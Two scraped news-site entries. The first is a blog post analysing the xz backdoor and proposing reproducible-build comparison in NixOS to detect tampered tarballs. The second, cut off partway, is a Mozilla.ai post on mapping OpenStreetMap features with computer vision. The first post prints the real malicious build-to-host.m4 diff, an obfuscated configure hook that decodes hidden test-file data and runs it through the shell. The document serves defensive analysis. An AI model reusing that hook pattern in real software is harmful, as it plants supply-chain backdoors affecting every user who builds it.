[
  {
    "id": "3f187cff992325c8",
    "title": {
      "en": "NixOS and reproducible builds could have detected the xz backdoor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://luj.fr/blog/how-nixos-could-have-detected-xz.html",
    "score": 173,
    "by": "birdculture",
    "time": 1742672399,
    "content": "How NixOS and reproducible builds could have detected the xz backdoor\nfor the benefit of all\n\n            Published on 2025-03-20\n\n            Estimated reading time: 22mn\n\n            Introduction\nIn March 2024, a backdoor was discovered in xz, a (de)-compression software that is regularly used at the core of Linux distributions to unpack source tarballs of packaged software. The backdoor had been covertly inserted by a malicious maintainer under the pseudonym of Jia Tan over a period of three years. This event deeply stunned the open source community as the attack was both of massive impact (it allowed remote code execution on all affected machines that had ssh installed) and extremely difficult to detect. In fact, it was only thanks to the diligence (and maybe luck) of Andres Freund – a Postgres developer working at Microsoft – that the catastrophe was avoided: while investigating a seemingly unrelated 500ms performance regression in ssh that he was experiencing on several Debian unstable machines, he was able to trace it back to the liblzma library, identify the backdoor and document it.\nWhile it was already established that the open source supply chain was often the target of malicious actors, what is stunning is the amount of energy invested by Jia Tan to gain the trust of the maintainer of the xz project, acquire push access to the repository and then among other perfectly legitimate contributions insert – piece by piece – the code for a very sophisticated and obfuscated backdoor. This should be a wake up call for the OSS community. We should consider the open source supply chain a high value target for powerful threat actors, and to collectively find countermeasures against such attacks.\nIn this article, I’ll discuss the inner workings of the xz backdoor and how I think we could have mechanically detected it thanks to build reproducibility.\nHow does the attack work?\nThe main intent of the backdoor is to allow for remote code execution on the target by hijacking the ssh program. To do that, it replaces the behavior of some of ssh’s functions (most importantly the RSA_public_decrypt one) in order to allow an attacker to execute arbitrary commands on a victim’s machine when some specific RSA key is used to log in. Two main pieces are combined to put together to install and activate the backdoor:\n\nA script to de-obfuscate and install a malicious object file as part of the xz build process.\nInterestingly the backdoor was not comprehensively contained in the source code for xz. Instead, the malicious components were only contained in tarballs built and signed by the malicious maintainer Jia Tan and published alongside releases 5.6.0 and 5.6.1 of xz. This time the additional release tarball contained slight and disguised modifications to extract a malicious object file from the .xz files used as data for some test contained in the repository.\nA procedure to hook the RSA_public_decrypt function. The backdoor uses the ifunc mechanism of glibc to modify the address of the RSA_public_function when ssh is loaded, in case ssh links against liblzma through libsystemd.\n\n  Info\n\n  The rest of this section goes into the details of the two steps mentionned. Reading it is not necessary to understand the rest of the article. The most important takeaway here is that the backdoor was only active when using the maintainer-provided release tarball.\n\n1. A script to de-obfuscate and install a malicious object file as part of the xz build process\nAs explained above, the malicious object file is stored directly in the xz git repository, hidden in some test files. The project being a decompression software, test cases include .xz files to be decompressed, making it possible to hide some machine code into fake test files;\nThe backdoor is not active in the code contained in the git repository, it is only included by building xz from the tarball released by the project, which has a few differences with the actual contents of the repository, most importantly in the m4/build-to-host.m4 file.\ndiff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4\nindex f928e9ab..d5ec3153 100644\n--- a/m4/build-to-host.m4\n+++ b/m4/build-to-host.m4\n@@ -1,4 +1,4 @@\n-# build-to-host.m4 serial 3\n+# build-to-host.m4 serial 30\n dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.\n dnl This file is free software; the Free Software Foundation\n dnl gives unlimited permission to copy and/or distribute it,\n@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],\n\n   dnl Define somedir_c.\n   gl_final_[$1]=\"$[$1]\"\n+  gl_[$1]_prefix=`echo $gl_am_configmake | sed \"s/.*\\.//g\"`\n   dnl Translate it from build syntax to host syntax.\n   case \"$build_os\" in\n     cygwin*)\n@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],\n   if test \"$[$1]_c_make\" = '\\\"'\"${gl_final_[$1]}\"'\\\"'; then\n     [$1]_c_make='\\\"$([$1])\\\"'\n   fi\n+  if test \"x$gl_am_configmake\" != \"x\"; then\n+    gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'\n+  else\n+    gl_[$1]_config=''\n+  fi\n+  _LT_TAGDECL([], [gl_path_map], [2])dnl\n+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl\n+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl\n+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl\n+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl\n   AC_SUBST([$1_c_make])\n+\n+  dnl If the host conversion code has been placed in $gl_config_gt,\n+  dnl instead of duplicating it all over again into config.status,\n+  dnl then we will have config.status run $gl_config_gt later, so it\n+  dnl needs to know what name is stored there:\n+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt=\"eval \\$gl_[$1]_config\"])\n ])\n\n dnl Some initializations for gl_BUILD_TO_HOST.\n AC_DEFUN([gl_BUILD_TO_HOST_INIT],\n [\n+  dnl Search for Automake-defined pkg* macros, in the order\n+  dnl listed in the Automake 1.10a+ documentation.\n+  gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n+  if test -n \"$gl_am_configmake\"; then\n+    HAVE_PKG_CONFIGMAKE=1\n+  else\n+    HAVE_PKG_CONFIGMAKE=0\n+  fi\n+\n   gl_sed_double_backslashes='s/\\\\/\\\\\\\\/g'\n   gl_sed_escape_doublequotes='s/\"/\\\\\"/g'\n+  gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n changequote(,)dnl\n   gl_sed_escape_for_make_1=\"s,\\\\([ \\\"&'();<>\\\\\\\\\\`|]\\\\),\\\\\\\\\\\\1,g\"\n changequote([,])dnl\n\nWhile these changes may look benign to the naive eyes and well commented, they are actually hiding a chain of commands that decrypts/deobfuscates several fake .xz test files to ultimately produce two files:\n\na shell script that is run during the build of xz ;\na malicious binary object file.\n\nThere is an excellent analysis from Russ Cox that explains in detail how these two malicious resources are produced during the build process, and I advise any interested reader to find all relevant details there.\nThe shell script run during the build has two main purposes:\n\nVerifying that the conditions to execute the backdoor are met on the builder (the backdoor targets specific Linux distributions, needs specific features of the glibc activated, needs ssh installed, etc) ;\nModifying the (legitimate) liblzma_la-crc64_fast.o to use the _get_cpuid symbol defined in the backdoor object file.\n\n2. A procedure to hook the RSA_public_decrypt function\nSo how does a backdoor in the xz executable have any effect on ssh?\nTo understand that, we have to take a little detour in the realm of dynamic loaders and dynamically linked programs. Whenever a program depends on a library, there are two ways that library can be linked into the final executable:\n\nstatically, in that case the library is embedded into the final executable, hence increasing its size ;\ndynamically, in which case it is the role of the dynamic loader (ld-linux.so in Linux) to find that shared library when the program starts and load it in memory.\n\nWhen a program is compiled using dynamic linking, the addresses of the symbols belonging to dynamically linked libraries cannot be provided at compilation time: their position in memory is not know ahead of time! Instead, a reference to the Global Offset Table (or GOT) is inserted. When the program is started, the actual addresses are filled in the GOT by the dynamic linker.\nThe xz backdoor uses a functionality of the glibc called ifunc to force execution of code during dynamic loading time: ifunc is designed to allow selection between several implementations of the same function at dynamic loading time.\n#include <stdio.h>\n\n// Declaration of ifunc resolver function\nint (*resolve_add(void))(int, int);\n\n// First version of the add function\nint add_v1(int a, int b) {\n    printf(\"Using add_v1\\n\");\n    return a + b;\n}\n\n// Second version of the add function\nint add_v2(int a, int b) {\n    printf(\"Using add_v2\\n\");\n    return a + b;\n}\n\n// Resolver function that chooses the correct version of the function\nint (*resolve_add(void))(int, int) {\n    // You can implement any runtime check here.\n    // In that case we check if the system is 64bit\n    if (sizeof(void*) == 8) {\n        return add_v2;\n    } else {\n        return add_v1;\n    }\n}\n\n// Define the ifunc attribute for the add function\nint add(int a, int b) __attribute__((ifunc(\"resolve_add\")));\n\nint main() {\n    int result = add(10, 20);\n    printf(\"Result: %d\\n\", result);\n    return 0;\n}\n\nIn the above example, the ifunc attribute surrounding the add function indicates that the version that will be executed will be determined at dynamic loading time by running the resolve_add function. In that case, the resolve_add function returns add_v1 or add_v2 depending if the running system is a 64 bit system or not – and as such is completely harmless – but this technique is used by the xz backdoor to run some malicious code at dynamic loading time.\nBut dynamic loading of which program? Well, of ssh! In some Linux distributions (Debian and Fedora for example), ssh is patched to support systemd notifications and for this purpose, links with libsystemd, that in turn links with liblzma. In those distribution sshd hence has a transitive dependency on liblzma.\n\nDependency chain between sshd and liblzma\n\nThis is how the backdoor works: whenever sshd is executed, the dynamic loader loads libsystemd and then liblzma. With the backdoor installed, and leveraging the ifunc functionality as explained above, the backdoor is able to run arbitrary code when liblzma is being loaded. Indeed, as you remember from the previous section, the backdoor script modifies one of the legitimate xz object files: it actually modifies the resolver of one of the functions that uses ifunc to call its own malicious _get_cpuid symbol. When called, this function meddles with the GOT (that is not yet read-only at this time of execution) to modify the address of the RSA_public_decrypt function, replacing it by a malicious one! That’s it, at this point sshd uses the malicious RSA_public_decrypt function that gives RCE privileges to the attacker.\nOnce again, there exist more precise reports on exactly how the hooking happens that a curious reader might read, like this one for example. There is also a research article summarizing the attack vector and possible mitigations that I recommend reading.\nAvoiding the xz catastrophe in the future\nWhat should our takeaways be from this near-miss and what should we do to minimize the risks of such an attack happening again in the future? Obviously, there is a lot to be said about the social issues at play here1 and how we can build better resilience in the OSS ecosystem against malicious entities taking over really fundamental OSS projects, but in this piece I’ll only address the technical aspects of the question.\nPeople are often convinced that OSS is more trustworthy than closed-source software because the code can be audited by practitioners and security professionals in order to detect vulnerabilities or backdoors. In this instance, this procedure has been made difficult by the fact that part of the code activating the backdoor was not included in the sources available within the git repository but was instead present in the maintainer-provided tarball. While this was used to hide the backdoor out of sight of most investigating eyes, this is also an opportunity for us to improve our software supply chain security processes.\nBuilding software from trusted sources\nOne immediate observation that we can make in reaction to this supply chain incident is that it was only effective because a lot of distributions were using the maintainer provided tarball to build xz instead of the raw source code supplied by the git forge (in this case, GitHub). This reliance on release tarballs has plenty of historical and practical reasons:\n\nthe tarball workflow predates the existence of git and was used in the earliest Linux distributions;\ntarballs are self-contained archives that encapsulate the exact state of the source code intended for release while git repositories can be altered, creating the need for a snapshot of the code;\ntarballs can contain intermediary artifacts (for example manpages) used to lighten the build process, or configure scripts to target specific hardware, etc;\ntarballs allow the source code to be compressed which is useful for space efficiency.\n\nThis being said, these reasons do not weigh enough in my opinion to justify the security risks they create. In all places where it is technically feasible, we should build software from sources authenticated by the most trustworthy party. For example, if a project is developed on GitHub, an archive is automatically generated by GitHub for each release. The risk of a compromise of that release archive is far lower than the risk of a malicious maintainer distributing unfaithful tarballs, as it would require compromising the GitHub infrastructure (and at this point the problem is much more serious). This reasoning can be extended in all cases where the development is happening on a platform operated by a trusted third party like Codeberg/SourceHut/Gitlab, etc.\nWhen the situation allows it…\nNixOS is a distribution built on the functional package management model, that is to say every package is encoded as an expression written in Nix, a functional programming language. A Nix expression for a software project is usually a function mapping all the project dependencies to a “build recipe” that can be later executed to build the package. I am a NixOS developer and I was surprised when the backdoor was revealed to see that the malicious version of xz had ended up being distributed to our users2. While there is no policy about this, there is a culture among NixOS maintainers of using the source archive automatically generated by GitHub (that are simply snapshots of the source code) when available through the fetchFromGitHub function. In the simplified example of the xz package below, you can see that the sources for the package are actually extracted from the manually uploaded malicious maintainer provided tarball through another source fetcher: fetchurl.\n{ lib, stdenv, fetchurl\n, enableStatic ? stdenv.hostPlatform.isStatic\n}:\n\nstdenv.mkDerivation rec {\n  pname = \"xz\";\n  version = \"5.6.0\";\n\n  src = fetchurl {\n    url = \"https://github.com/tukaani-project/xz/releases/download/v${version}/xz-${version}.tar.xz\";\n    hash = \"sha256-AWGCxwu1x8nrNGUDDjp/a6ol4XsOjAr+kncuYCGEPOI=\";\n  };\n...\n}\n\nTo understand why, we must first talk about the bootstrap of nixpkgs. The concept of a bootstrap is the idea that one could rebuild all of the packages in nixpkgs from a small set of seed binaries. This is an important security property because it means that there are no other external tools that one must trust in order to trust the toolchain that is used to build the software distribution. What we call the “bootstrap” in the context of a software distribution like nixpkgs, is all the steps needed to build the basic compilation environment to be used by other packages, called stdenv in nixpkgs. Building stdenv is not an easy task; how does one build gcc when one doesn’t even have a C compiler? The answer is that you start from a very small binary that does nothing fancy but is enough to build hex, a minimalist assembler, which in turn can build a more complex assembler, and this until we are able to build more complex software and finally a modern C compiler. The bootstraping story of Nix/Guix is an incredibly interesting topic, that I will not cover extensively here, but I strongly advise reading blog posts from the Guix community, that are on the bleeding edge (they have introduced a 357-byte bootstrap that is being adapted for nixpkgs).\nWhat does all that has to do with xz though? Well, xz is included in the nixpkgs bootstrap!\n$ nix-build -A stdenv\n/nix/store/91d27rjqlhkzx7mhzxrir1jcr40nyc7p-stdenv-linux\n$ nix-store --query --graph result\n\nWe can see now that stdenv depends at runtime on xz, so it is indeed built during the bootstrap stage. To understand a bit more why this is the case, I’ll also generate a graph of the software in stdenv that depends on xz at buildtime.\n$ nix-store --query --graph $(nix-eval --raw -f default stdenv.drvPath)\n\nWe can see that several packages depend on xz. Let’s take coreutils for example and try to understand why it depends on xz by reading its derivation file, which is the intermediary representation of the build process obtained by evaluating the Nix expression for coreutils:\n{\n  \"/nix/store/57hlz5fnvfgljivf7p18fmcl1yp6d29z-coreutils-9.5.drv\": {\n    \"args\": [\n      \"-e\",\n      \"/nix/store/v6x3cs394jgqfbi0a42pam708flxaphh-default-builder.sh\"\n    ],\n    \"builder\": \"/nix/store/razasrvdg7ckplfmvdxv4ia3wbayr94s-bootstrap-tools/bin/bash\",\n\n      ...\n\n    \"inputDrvs\": {\n\n      ...\n\n      \"/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv\": {\n        \"dynamicOutputs\": {},\n        \"outputs\": [\n          \"bin\"\n        ]\n      },\n      \"/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv\": {\n        \"dynamicOutputs\": {},\n        \"outputs\": [\n          \"out\"\n        ]\n      }\n    },\n\n    ...\n\n    \"system\": \"x86_64-linux\"\n  }\n}\n\nThe inputDrvs field here correspond to all the other packages or expressions that the coreutils build process depends on. We see that in particular it depends on two components:\n\n/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv, which is xz itself;\n/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv which is a source archive for coreutils! As it is a .xz archive, we need xz to unpack it and that is where the dependency comes from!\n\nThe same reasoning applies to the other three direct dependencies that we could see in the graph earlier.\nxz being built as part of the bootstrap means it doesn’t have access to all the facilities normal packages in nixpkgs can rely on. In particular it can only access packages that are built before in bootstrap. For example, to build xz from sources, we need autoconf to generate the configure script. But autoconf has a dependency on xz! Using the maintainer tarball allows us to break this dependency cycle.\n$ nix why-depends --derivation nixpkgs#autoconf nixpkgs#xz\n/nix/store/2rajzdx3wkivlc38fyhj0avyp10k2vjj-autoconf-2.72.drv\n└───/nix/store/jnnb5ihdh6r3idmqrj2ha95ir42icafq-stdenv-linux.drv\n    └───/nix/store/sqwqnilfwkw6p2f5gaj6n1xlsy054fnw-xz-5.6.4.drv\n\nIn conclusion, at the point in the nixpkgs graph where the xz package is built, the GitHub source archive cannot be used and we have to rely on the maintainer provided tarball, and hence, trust it. That does not mean that further verification cannot be implemented in nixpkgs, though…\nBuilding trust into untrusted release tarballs\nTo recap, the main reason that made NixOS vulnerable to the xz attack is that it is built as part of the bootstrap phase, at a point where we rely on maintainer-provided tarballs instead of the ones generated by GitHub. This incident shows that we should have specific protections in place, to ensure software built as part of our bootstrap is trustworthy.\n1. By comparing sources\nOne idea that comes to mind is that it should be easy, as a distribution, to verify that the sources tarballs we are using are indeed identical to the GitHub ones. There was even a pull request opened to introduce such a protection scheme. While this seem like a natural idea, it doesn’t really work in practice: it’s not that rare that the maintainer provided tarball differs from the sources, and it’s often nothing to worry about.\n\nAs Daniel Stenberg (the maintainer of curl) explains, the release tarball being different than the source is a feature: it allows the maintainer to include intermediary artifacts like manpages or configure scripts for example (this is especially useful for distributions that want to get rid of the dependency on autoconf to build the program). Of course when we care about software supply chain security, this flexibility that project maintainers have in the way they provide the release assets is actually a liability because it forces us to trust them to do it honestly.\n2. Leveraging bitwise reproducibility\nReproducible builds is a property of a software project that is verified if building it twice in the same conditions yields the exact same (bitwise identical) artifacts. Build reproducibility is not something easy to obtain, as there are all kinds of nondeterminisms that can happen in build processes, and making as many packages as possible reproducible is the purpose of the reproducible-builds group. It is also a property recognized as instrumental to increase the trust in the distribution of binary artifacts (see Reproducible Builds: Increasing the Integrity of Software Supply Chains for a detailed report).\nThere are several ways bitwise reproducibility could be used to build up trust in untrusted maintainer provided tarballs:\n\nReproducibly building the tarball\nA first approach that has been adopted by the postgresql project is to make the tarball generation process reproducible. This allows any user (or a linux distribution) to independently verify that the maintainer provided tarball was honestly generated from the original source code.\n\nWith this method, you can keep some advantages of building from tarballs (including the tarball containing some intermediary build artifacts like manpages or configure scripts). However, the drawback of this approach for software supply chain security is that it has to be implemented by upstream project maintainers. This means that adoption of this kind of security feature will probably be slow in the FOSS community, and while it is a good practice to make everything reproducible, including the tarball generation process, this is not the most effective way to increase software supply chain security today.\nChecking for build convergence between various starting assets\n\n  Info\n\n  This part is about how I think NixOS could have detected the xz attack even though xz is built as part of the NixOS bootstrap phase.\n\nAssuming xz is bitwise reproducible (and that is indeed the case), and that the maintainer provided tarball doesn’t contain any modification that impacts the build process, building it from the GitHub tarball or from the maintainer provided tarball should produce the same artifacts, right? Based on this idea, my proposal is to build xz a second time after the bootstrap, this time using the GitHub tarball (which is only possible after the bootstrap). If both builds differ we can suspect that there a suspicion of a supply chain compromise.\n\nSummary of the method I propose to detect vulnerable xz source tarballs\n\nLet’s see how this could be implemented:\nFirst, we rewrite the xz package, this time using the fetchFromGitHub function. I create a after-boostrap.nix file alongside the original xz expression in the pkgs/tools/compression/xz directory of nixpkgs:\n  {\n  lib,\n  stdenv,\n  fetchurl,\n  enableStatic ? false,\n  writeScript,\n  fetchFromGitHub,\n  testers,\n  gettext,\n  autoconf,\n  libtool,\n  automake,\n  perl538Packages,\n  doxygen,\n  xz,\n}:\n\nstdenv.mkDerivation (finalAttrs: {\n  pname = \"xz\";\n  version = \"5.6.1\";\n\n  src = fetchFromGitHub {\n    owner = \"tukaani-project\";\n    repo = \"xz\";\n    rev = \"v${finalAttrs.version}\";\n    hash = \"sha256-alrSXZ0KWVlti6crmdxf/qMdrvZsY5yigcV9j6GIZ6c=\";\n  };\n\n  strictDeps = true;\n  configureFlags = lib.optional enableStatic \"--disable-shared\";\n  enableParallelBuilding = true;\n  doCheck = true;\n\n  nativeBuildInputs = [\n    gettext\n    autoconf\n    libtool\n    automake\n    perl538Packages.Po4a\n    doxygen\n    perl\n  ];\n\n  preConfigure = ''\n    ./autogen.sh\n  '';\n\n})\n\nI removed details here to focus on the most important: the Nix expression is very similar to the actual derivation for xz, the only difference (apart from the method to fetch the source) is that we need to use autoconf to generate configure scripts. When using the maintainer provided tarball these are already pre-generated for us (as Daniel Stenberg was explaining in the toot above) – which is very handy particularly when you are building xz in the bootstrap phase of a distribution and you don’t want a dependency on autoconf / automake – but in this instance we have to do it ourselves.\nNow that we can build xz from the code archive provided by GitHub, we have to write Nix code to compare both outputs. For that purpose, we register a new phase called compareArtifacts, that runs at the very end of the build process. To make my point, I’ll first only compare the liblzma.so file (the one that was modified by the backdoor), but we could easily generalize this phase to all binaries and libraries outputs:\npostPhases = [ \"compareArtifacts\" ];\n\ncompareArtifacts = ''\n  diff $out/lib/liblzma.so ${xz.out}/lib/liblzma.so\n'';\n\nAfter this change, building xz-after-bootstrap on master3 still works, showing that in a normal setting, both artifacts are indeed identical.\n$ nix-build -A xz-after-bootstrap\n/nix/store/h23rfcjxbp1vqmmbvxkv0f69r579kfc1-xz-5.6.1\n\nLet’s now try our detection method on the backdoored xz and see what happens! We checkout revision c53bbe3 that contains the said version4, and build xz-after-bootstrap.\n$ git checkout c53bbe3\n$ nix-build -A xz-after-boostrap\n/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1\n\nAgain, identical artifacts? Remember that the backdoor was not active in NixOS, partly because there is a check that the RPM_ARCH variable is set in the script that installs the backdoor. So let’s set it in pkgs/tools/compression/xz/default.nix to activate the backdoor5.\nenv.RPM_ARCH = true;\n\n$ nix-build -A xz-after-boostrap\n/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1\n...\n...\nRunning phase: compareBins\nBinary files /nix/store/cxz8iq3hx65krsyraill6figp03dk54n-xz-5.6.1/lib/liblzma.so and /nix/store/4qp2khyb22hg6a3jiy4hqmasjinfkp2g-xz-5.6.1/lib/liblzma.so differ\n\nThat’s it, binary artifacts are different now! Let’s try to understand a bit more what makes them different by keeping them as part of the output. For that, we modify the compareArtifacts phase:\ncompareArtifacts = ''\n  cp ${xz.out}/lib/liblzma.so $out/xzBootstrap\n  cp $out/lib/liblzma.so $out/xzAfterBootstrap\n  diff $out/lib/liblzma.so ${xz.out}/lib/liblzma.so || true\n'';\n\nThis time the diff doesn’t make the build fail and we store both versions of the liblzma.so to be able to compare them afterwards.\n$ ls -lah result\ntotal 69M\ndr-xr-xr-x      6 root root     99 Jan  1  1970 .\ndrwxrwxr-t 365666 root nixbld  85M Dec 10 14:27 ..\ndr-xr-xr-x      2 root root   4.0K Jan  1  1970 bin\ndr-xr-xr-x      3 root root     32 Jan  1  1970 include\ndr-xr-xr-x      3 root root    103 Jan  1  1970 lib\ndr-xr-xr-x      4 root root     31 Jan  1  1970 share\n-r-xr-xr-x      1 root root   210K Jan  1  1970 xzAfterBootstrap\n-r-xr-xr-x      1 root root   258K Jan  1  1970 xzBootstrap\n\nWe can notice that there is even a significant size difference between the two artifacts with an increase of 48Kb for the backdoored one. Let’s try to understand where this difference comes from. We can use the nm command from binutils to list the symbols in an artifact:\n$ nm result/xzAfterBootstrap\n000000000000d3b0 t alone_decode\n000000000000d380 t alone_decoder_end\n000000000000d240 t alone_decoder_memconfig\n0000000000008cc0 t alone_encode\n0000000000008c90 t alone_encoder_end\n0000000000008db0 t alone_encoder_init\n0000000000020a80 t arm64_code\n0000000000020810 t arm_code\n0000000000020910 t armthumb_code\n000000000000d8d0 t auto_decode\n000000000000d8a0 t auto_decoder_end\n000000000000d730 t auto_decoder_get_check\n000000000000d7a0 t auto_decoder_init\n000000000000d750 t auto_decoder_memconfig\n0000000000022850 r available_checks.1\n00000000000225f0 r bcj_optmap\n0000000000008fb0 t block_buffer_encode\n...\n\nNow we can diff the symbols between the two artifacts:\n$ diff -u0 <(nm --format=just-symbols xzAfterBootstrap) <(nm --format=just-symbols xzBootstrap)\n--- /dev/fd/63\t2024-12-10 15:27:11.477332683 +0000\n+++ /dev/fd/62\t2024-12-10 15:27:11.478332717 +0000\n@@ -31,0 +32 @@\n+_cpuid\n@@ -65,0 +67 @@\n+_get_cpuid\n@@ -448,0 +451 @@\n+__tls_get_addr@GLIBC_2.3\n\nTADA! We see the added _get_cpuid symbol, documented in numerous technical report about the xz backdoor, confirming our method works!\nAddendum 1: How to implement this safeguard in nixpkgs?\nI think nixpkgs should implement this kind of safeguard for every package built as part of the bootstrap phase that is not using a trusted source archive. The *-after-bootstrap packages could then be added to the channel blockers to ensure that there is big red alarm that requires intervention from the maintainers if ever one of those would not build.\nAs a proof of concept, and to gather the feedback of the community I opened a pull request in the nixpkgs repository for the xz case, but if the method is adopted we should then implement it for the other candidate packages in nixpkgs’s bootstrap.\nAddendum 2: Evaluation: reproducibility of stdenv over time\nAs discussed above, the method I propose assumes the packages we want to build trust in are bitwise reproducible. In order to help validate the approach, let’s verify that the packages belonging to the stdenv runtime are indeed reproducible.\nTo do that, I have (as part of a bigger research project whose findings are summarized in another blog post) sampled 17 nixpkgs-unstable revisions from 2017 to 2023 and rebuilt every non-fixed-output-derivation (FOD) composing stdenv from these revisions using the nix-build --check command to check for bitwise reproducibility.\nHere are my findings:\n\nIn every revision xz was bitwise reproducible ;\nIn 12 of the 17 revisions there was either one or two packages that were buildable but not reproducible, but those packages are consistent over time: for example gcc has consistently been non reproducible from 2017 to 2021 and bash until 2019.\n\nThese findings, while showing that this method cannot be applied to every package in stdenv, are encouraging: even if some packages are not bitwise reproducible, they are consistently so, which means that it should be possible to selectively activate it on packages that exhibit good reproducibility in the long term.\nAddendum 3: Limitations: the trusting trust issue\nThe trusting trust issue is a famous thought experiment initiated by Ken Thomson during his Turing award acceptance lecture. The idea is the following: assume there is a backdoor in compilers we use to build our software such that the compiler propagates the backdoor to all new version of itself that it builds, but behaves normally for any other build until some point in time where it backdoors all executables it produces. Moderns compilers often need a previous version of themselves to be compiled so there must be an initial executable that we have to trust to build our software, making this kind of sophisticated attack theoretically possible and completely undetectable.\nSimilarly, the method I am proposing here requires to make the assumption that the untrusted xz (the one built during the bootstrap phase) can’t indirectly corrupt the build of xz-after-bootstrap to make it look like the produced artifacts are identical. Again, such an attack would probably be extremely complex to craft so the assumption here seems sane.\n\nThanks\nI would like to thank Théo Zimmermann, Pol Dellaiera, Martin Schwaighofer, and Stefano Zacchiroli for their valuable feedback and insightful discussions during the writing of this blog post. Their contributions significantly helped me organize and refine my ideas on this topic.\n\nJia Tan essentially (through multiple identities) pressured the main xz maintainer into accepting new maintainers for the project, claiming that the project was receiving sub-par maintenance.↩︎\nFortunately, even though the malicious version was available to users, the backdoor was not active on NixOS has it was specifically made to target Debian and Fedora systems.↩︎\nTested at the time of writing on revision 1426c51↩︎\nFor obvious reasons, the backdoored tarball has been deleted from GitHub and the project’s website but it is still available in the NixOS cache!↩︎\nThis illustrates the power and limitation of this method: it only detects modifications of the tarball that have an impact on the final result. In the case of the xz backdoor, NixOS executables did not contain the backdoor and as such without any modification we would not have discovered the backdoor. So yes, the title is a little bit catchy, but illustrates the idea.↩︎",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6bf5f1d4fb0b83cb",
    "title": {
      "en": "Map Features in OpenStreetMap with Computer Vision",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.mozilla.ai/map-features-in-openstreetmap-with-computer-vision/",
    "score": 185,
    "by": "Brysonbw",
    "time": 1742665330,
    "content": "Map Features in OpenStreetMap with Computer Vision\n                Mozilla.ai developed and released the OpenStreetMap AI Helper Blueprint. If you love maps and are interested in training your own computer vision model, you’ll enjoy diving into this Blueprint.\n\n                    David de la Iglesia Castro\n\n                        Mar 4, 2025\n                            — 5 min read\n\n            Photo by Stefancu Iulian / Unsplash\n\n            MotivationAt Mozilla.ai, we believe that there are a lot of opportunities where artificial intelligence (AI) can empower communities driven by open collaboration.These opportunities need to be designed carefully, though, as many members of these communities (and people in general) are increasingly worried about the amount of AI slop flooding the internet.With this idea in mind we developed and released the OpenStreetMap AI Helper Blueprint. If you love maps and are interested in training your own computer vision model, you’ll enjoy diving into this Blueprint.Why OpenStreetMap?Data is one of the most important components of any AI application, and OpenStreetMap has a vibrant community that collaborates to maintain and extend the most complete open map database available. If you haven’t heard of it, OpenStreetMap is an open, editable map of the world created by a community of mappers who contribute and maintain data about roads, trails, cafés, railway stations, and more.Combined with other sources, like satellite imagery, this database offers infinite possibilities to train different AI models.As a long-time user and contributor to OpenStreetMap , I wanted to build an end-to-end application where a model is first trained with this data and then used to contribute back.The idea is to use AI to speed up the slower parts of the mapping process (roaming around the map, drawing polygons) while keeping a human in the loop for the critical parts (verifying that the generated data is correct).Why Computer Vision?Large Language Models (LLM) and, more recently, Visual Language Models (VLM) are sucking all the oxygen out of the AI room, but there are a lot of interesting applications that don’t (need to) use this type of models.Many of the Map Features you can find in OpenStreetMap are represented with a polygon ('Area'). It turns out that finding and drawing these polygons is a very time consuming task for a human, but Computer Vision models can be easily trained for the task (when provided with enough data).We chose to split the work of finding and drawing map features into 2 computer vision tasks using state-of-the-art non-LLM models: Object Detection with YOLOv11, by Ultralytics, which identifies where relevant features exist in an image.Segmentation with SAM2, by Meta, which refines the detected features by outlining their exact shape.These models are lightweight, fast, and local-friendly – it’s refreshing to work with models that don’t demand a high-end GPU just to function. As an example, the combined weights of YOLOv11 and SAM2 take much less disk space (<250MB) than any of the smallest Visual Language Models available, like SmolVLM (4.5GB).By combining these models, we can automate much of the mapping process while keeping humans in control for final verification.The OpenStreetMap AI Helper BlueprintThe Blueprint can be divided into 3 stages:Stage 1: Create an Object Detection dataset from OpenStreetMapThe first stage involves fetching data from OpenStreetMap, combining it with satellite images, and transforming it into a format suitable for training.You can run it yourself in the Create Dataset Colab.For fetching OpenStreetMap data, we use:The Nominatim API to provide users with a flexible way of selecting an area of interest. In our swimming pool example, we use Galicia for training and Viana do Castelo for validation.The Overpass API to download all the relevant polygons using specific tags within the selected area of interest. In our swimming pool example, we use leisure=swimming_pool discarding the ones also tagged with location=indoor.Once all the polygons have been downloaded, you can choose a zoom level. We use this zoom level to first identify all the tiles that contain a polygon and then download them using the Static Tiles API from Mapbox.The polygons in latitude and longitude coordinates are transformed to a bounding box in pixel coordinates relative to each tile and then saved in the Ultralytics YOLO format.Finally, the dataset is uploaded to the Hugging Face Hub. You can check our example mozilla-ai/osm-swimming-pools.Stage 2 - Finetune an Object Detection modelOnce the dataset is uploaded in the right format, finetuning a YOLOv11 (or any other model supported by Ultralytics) is quite easy. You can run it yourself in the Finetune Model Colab and check all the available hyperparameters.Once the model is trained, it is also uploaded to the Hugging Face Hub. You can check our example mozilla-ai/swimming-pool-detector.Stage 3 - Contributing to OpenStreetMapOnce you have a finetuned Object Detection model, you can use it to run inference across multiple tiles. You can run inference yourself in the Run Inference Colab. We also provide a hosted demo where you can try our example swimming pool detector: HuggingFace Demo.The inference requires a couple of human interactions. First, you need to first pick a point of interest in the map:After a point is selected, a bounding box is computed around it based on the margin 